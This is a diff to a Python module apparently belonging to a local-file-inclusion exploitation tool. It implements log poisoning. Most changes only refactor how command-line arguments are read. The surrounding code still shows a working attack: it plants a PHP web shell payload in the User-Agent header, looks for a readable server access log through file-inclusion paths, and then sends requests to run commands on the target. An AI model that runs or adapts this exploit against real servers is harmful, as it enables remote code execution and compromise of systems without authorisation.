@@ -1,7 +1,7 @@
 """Log Poison"""
 import os
 
-from src.utils.arguments import args
+from src.utils.arguments import ArgumentHandler
 from src.httpreqs import request
 from src.configs import config
 from src.utils.args_check import scriptDirectory
@@ -13,10 +13,11 @@ from src.utils.info import printInfo
 def exploit_log_poison(
     ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post
 ):
-    if args.f:
+    args = ArgumentHandler()
+    if args.args['f']:
         return
 
-    maliciousHeaders = args.httpheaders.copy()
+    maliciousHeaders = args.args['httpheaders'].copy()
     maliciousHeaders["User-Agent"] = "<?php system($_GET['c']); ?>"
     lastPrintedStringLen = 0
 
@@ -49,7 +50,7 @@ def exploit_log_poison(
             if post:
                 res, _ = request.REQUEST(
                     url,
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post.replace(config.tempArg, line),
                     config.proxies,
                     "",
@@ -59,7 +60,7 @@ def exploit_log_poison(
             else:
                 res, _ = request.REQUEST(
                     url.replace(config.tempArg, line),
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -67,7 +68,7 @@ def exploit_log_poison(
                     exploit=True,
                 )
 
-            if args.httpheaders["User-Agent"] in res.text:
+            if args.args['httpheaders']["User-Agent"] in res.text:
                 lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
                 print(
                     "\n"
@@ -115,7 +116,7 @@ def exploit_log_poison(
                 print(exploitUrl)
                 res, _ = request.REQUEST(
                     exploitUrl,
-                    args.httpheaders,
+                    args.args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -133,7 +134,7 @@ def exploit_log_poison(
                         )
                         request.REQUEST(
                             url,
-                            args.httpheaders,
+                            args.args['httpheaders'],
                             exploitPost,
                             config.proxies,
                             "",
@@ -149,7 +150,7 @@ def exploit_log_poison(
                             request.REQUEST(
                                 url,
                                 exploitPost,
-                                args.httpheaders,
+                                args.args['httpheaders'],
                                 config.proxies,
                                 "",
                                 "",
@@ -168,7 +169,7 @@ def exploit_log_poison(
                         )
                         request.REQUEST(
                             exploitUrl,
-                            args.httpheaders,
+                            args.args['httpheaders'],
                             post,
                             config.proxies,
                             "",
@@ -188,7 +189,7 @@ def exploit_log_poison(
                             )
                             request.REQUEST(
                                 exploitUrl,
-                                args.httpheaders,
+                                args.args['httpheaders'],
                                 post,
                                 config.proxies,
                                 "",
@@ -198,7 +199,7 @@ def exploit_log_poison(
                         break
         else:
             # lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
-            if args.verbose:
+            if args.args['verbose']:
                 printFancyString(
                     colors.red("[-]")
                     + " Couldn't locate target server's access log to poison or log is not readable.\n",
